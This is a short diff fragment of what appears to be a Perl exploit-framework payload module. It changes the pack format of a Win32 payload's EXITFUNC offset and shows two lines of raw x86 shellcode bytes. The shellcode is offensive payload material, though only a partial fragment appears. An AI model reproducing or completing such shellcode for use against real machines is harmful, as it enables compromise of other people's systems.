@@ -19,7 +19,7 @@ my $info =
     # win32 specific code
     'Win32Payload' =>
     {
-        Offsets => { 'EXITFUNC' => [21, 'L'] },
+        Offsets => { 'EXITFUNC' => [21, 'V'] },
         Payload =>
         "\x81\xec\x0f\x0b\x00\x00\x89\xe6\x89\xe5\xe8\xb9\x00\x00\x00\x89".
         "\x06\x89\xc3\x53\x68\x7e\xd8\xe2\x73\xe8\xbf\x00\x00\x00\x89\x46".
